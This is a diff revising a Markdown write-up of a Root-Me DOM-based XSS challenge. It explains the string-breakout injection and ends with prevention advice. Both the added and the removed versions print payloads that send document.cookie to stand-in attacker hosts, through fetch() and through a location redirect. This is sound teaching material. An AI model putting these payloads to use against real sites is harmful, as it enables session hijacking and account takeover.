@@ -1,27 +1,21 @@
 # XSS DOM-Based - Introduction
 [Root-Me Challenge Proof](https://www.root-me.org/?page=validation&id_challenge=2914&id_auteur=1089475&lang=en)
 
-## Lab Overview
-
 This lab demonstrates a **DOM-Based Cross-Site Scripting (XSS)** vulnerability.
 
-Unlike reflected or stored XSS, the payload is executed entirely inside the browser through client-side JavaScript.
-
-The vulnerable application reads data from a URL parameter and inserts it directly into a JavaScript variable without proper sanitization.
+Unlike reflected or stored XSS, the payload is processed entirely by client-side JavaScript. The server simply reflects user input into a JavaScript variable, and the browser executes the resulting script.
 
 ---
 
-# Identifying the Injection Point
+# Finding the Injection Point
 
-Parameter:
+The vulnerable parameter was:
 
 ```text
 http://challenge01.root-me.org/web-client/ch32/index.php?number=nnn
 ```
 <img width="1868" height="579" alt="image" src="https://github.com/user-attachments/assets/6870f972-7d17-43eb-be1e-700b1ebfe617" />
-
-
-The value is reflected inside a script block:
+The value of `number` was reflected inside a JavaScript block:
 
 ```javascript
 var random = Math.random() * (99);
@@ -39,273 +33,175 @@ else{
 }
 ```
 
-Notice:
+---
+
+# Why It Is Vulnerable
+
+User input is placed directly inside a JavaScript string:
 
 ```javascript
 var number = 'USER_INPUT';
 ```
 
-User-controlled input is placed directly inside a JavaScript string.
+No escaping or sanitization is performed.
 
-This is the vulnerability.
+This means an attacker can:
+
+1. Close the existing string
+2. Inject arbitrary JavaScript
+3. Comment out the remaining code
 
 ---
 
-# Confirming XSS
+# Proof of Concept
 
 Payload:
 
 ```text
-?number=1';alert(1)//
+1';alert(1)//
 ```
 
-Resulting script:
+URL:
+
+```text
+http://challenge01.root-me.org/web-client/ch32/index.php?number=1';alert(1)//
+```
+
+Resulting JavaScript:
 
 ```javascript
 var number = '1';
-alert(1)//';
+alert(1);
+//';
 ```
 
-Explanation:
+### What Happens?
 
-1. `'` closes the original string
-2. `alert(1)` executes arbitrary JavaScript
-3. `//` comments out the remaining quote
+1. `'1'` closes the original string.
+2. `alert(1)` executes attacker-controlled JavaScript.
+3. `//` comments out the remaining quote to prevent syntax errors.
 
-Browser interprets it as valid JavaScript and executes the payload.
+The alert box confirms successful JavaScript execution.
+
+---
+
+# Cookie Theft Demonstration
+
+After confirming code execution, tested data exfiltration using an external listener.
+
+Payload:
+
+```javascript
+';fetch('https://attacker-server/?c=' + document.cookie)//
+```
+
+URL-encoded version:
+
+```text
+http://challenge01.root-me.org/web-client/ch32/?number=%27%3Bfetch(%27https%3A%2F%2Fattacker-server%2F%3Fc%3D%27%20%2B%20document.cookie)%2F%2F
+```
+
+---
+
+# How It Works
+
+Injected code becomes:
+
+```javascript
+var number = '';
+fetch('https://attacker-server/?c=' + document.cookie);
+//';
+```
+
+Execution flow:
+
+1. Browser executes injected JavaScript.
+2. `document.cookie` reads accessible cookies.
+3. `fetch()` sends an HTTP request to the attacker-controlled server.
+4. Cookie values are included in the request.
+
+Example request:
+
+```text
+GET /?c=session=abc123
+```
+<img width="1252" height="500" alt="image" src="https://github.com/user-attachments/assets/0e65828e-a085-45ef-b966-d4bab8d0c55f" />
+The attacker receives the victim's cookie value.
 
 ---
 
 # Why This Is DOM-Based XSS
 
-The payload is injected into JavaScript code and executed by the browser.
+The vulnerability exists inside browser-side JavaScript logic.
 
 Characteristics:
 
-- No HTML injection required
-- No `<script>` tag required
-- JavaScript context breakout
-- Execution happens client-side
+- User input reaches a DOM sink
+- JavaScript processes the data
+- Execution happens in the browser
+- No server-side payload storage required
 
----
-
-# Why the Fetch Payload Failed
-
-Attempted payload:
-
-```javascript
-fetch('http://attacker.com/c?='document.cookie)//
-```
-
-Problem:
-
-```javascript
-'http://attacker.com/c?='document.cookie
-```
-
-is invalid JavaScript syntax.
-
-JavaScript expects concatenation:
-
-```javascript
-'http://attacker.com/c?=' + document.cookie
-```
-
-or
-
-```javascript
-`http://attacker.com/c?=${document.cookie}`
-```
-
-Without the operator, the browser throws a syntax error and stops execution.
-
-Simplified example:
-
-Invalid:
-
-```javascript
-'hello'document.cookie
-```
-
-Valid:
-
-```javascript
-'hello' + document.cookie
-```
-
----
-
-# Why the Redirect Payload Worked
-
-Working payload:
-
-```javascript
-';document.location.href=
-'http://attacker.com/?itworks='
-.concat(document.cookie);// 
-```
-
-Resulting script:
-
-```javascript
-var number = '';
-
-document.location.href =
-'http://attacker.com/?itworks='
-.concat(document.cookie);
-
-//';
-```
-
----
-
-# What Happens Internally
-
-### Step 1
-
-Break out of the string:
-
-```javascript
-';
-```
-
-Original assignment ends.
-
----
-
-### Step 2
-
-Execute attacker-controlled JavaScript:
-
-```javascript
-document.location.href =
-'http://attacker.com/?itworks='
-.concat(document.cookie);
-```
-
----
-
-### Step 3
-
-Browser navigates to:
+Data flow:
 
 ```text
-http://attacker.com/?itworks=COOKIE_VALUE
+URL Parameter
+      ↓
+JavaScript Variable
+      ↓
+Browser Executes Code
+      ↓
+DOM-Based XSS
 ```
 
 ---
 
-### Step 4
+# Impact
 
-The browser sends an HTTP request to the attacker server.
-
-Example:
-
-```http
-GET /?itworks=PHPSESSID=abc123
-```
-
-The attacker receives the cookie value.
-
----
-
-### Step 5
-
-Comment out the remainder:
-
-```javascript
-//
-```
-
-Prevents syntax errors from the trailing quote.
-
----
-
-# Why `.concat()` Works
-
-This:
-
-```javascript
-'http://attacker.com/?itworks='
-.concat(document.cookie)
-```
-
-is equivalent to:
-
-```javascript
-'http://attacker.com/?itworks=' + document.cookie
-```
-
-Example:
-
-```javascript
-document.cookie
-```
-
-returns:
-
-```text
-PHPSESSID=abc123
-```
-
-Final URL becomes:
-
-```text
-http://attacker.com/?itworks=PHPSESSID=abc123
-```
-<img width="1252" height="500" alt="image" src="https://github.com/user-attachments/assets/0e65828e-a085-45ef-b966-d4bab8d0c55f" />
-
----
-
-# Key Learning Points
-
-- DOM XSS occurs entirely in the browser
-- JavaScript context is critical when crafting payloads
-- Breaking out of quotes is a common exploitation technique
-- `//` is often used to neutralize trailing code
-- Cookie theft commonly uses:
-  - redirects
-  - image requests
-  - fetch/XMLHttpRequest requests
-- Payload syntax matters; a small JavaScript error can completely break exploitation
-
----
-
-# Security Impact
-
-Successful DOM XSS can lead to:
+Successful exploitation may allow:
 
 - Session hijacking
 - Account takeover
-- Credential theft
-- CSRF bypasses
-- Malicious actions on behalf of users
+- Sensitive data theft
+- Actions performed as the victim
+- Phishing and content manipulation
+
+The actual impact depends on:
+
+- Cookie protections
+- CSP implementation
+- User privileges
+- Application functionality
+
+---
+
+# Key Learnings
+
+- Reflection inside JavaScript contexts is highly dangerous.
+- Breaking out of strings is a common XSS technique.
+- `//` comments help avoid syntax errors after injection.
+- DOM-Based XSS occurs entirely in the browser.
+- Any user-controlled data inserted into JavaScript without proper encoding can lead to code execution.
 
 ---
 
 # Prevention
 
-Never place user input directly into JavaScript code:
+- Never insert user input directly into JavaScript code.
+- Apply context-aware output encoding.
+- Use safe DOM APIs such as:
 
 ```javascript
-var number = userInput;
+textContent
+innerText
 ```
 
-Use:
-
-- Context-aware output encoding
-- Safe DOM APIs
-- Input validation
-- Content Security Policy (CSP)
-
-Instead of:
+instead of dangerous sinks like:
 
 ```javascript
-element.innerHTML = userInput;
+innerHTML
+eval()
+document.write()
 ```
 
-prefer:
-
-```javascript
-element.textContent = userInput;
-```
+- Implement a strong Content Security Policy (CSP).
+- Validate and sanitize all user-controlled input.
